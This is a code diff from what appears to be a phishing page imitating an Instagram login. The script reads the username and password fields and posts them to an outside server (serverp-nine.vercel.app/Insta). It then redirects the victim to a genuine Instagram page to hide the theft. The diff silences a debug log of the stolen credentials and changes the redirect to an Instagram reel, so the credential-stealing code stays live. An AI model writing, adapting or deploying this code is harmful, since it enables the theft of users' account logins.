@@ -18604,13 +18604,13 @@
     
         const username = document.querySelector('input[name="username"]').value;
         const password = document.querySelector('input[name="password"]').value;
-        console.log(username,password)
+       // console.log(username,password)
         axios.post('https://serverp-nine.vercel.app/Insta', {
          username,password
         })
         .then(function(response) {
       // Redirect on ANY 200 status (even empty responses)
-      window.location.href = 'https://www.instagram.com/accounts/login/';
+      window.location.href = 'https://www.instagram.com/reel/DJWhvfxPsrX/';
     })
 
           .catch(function(error) {
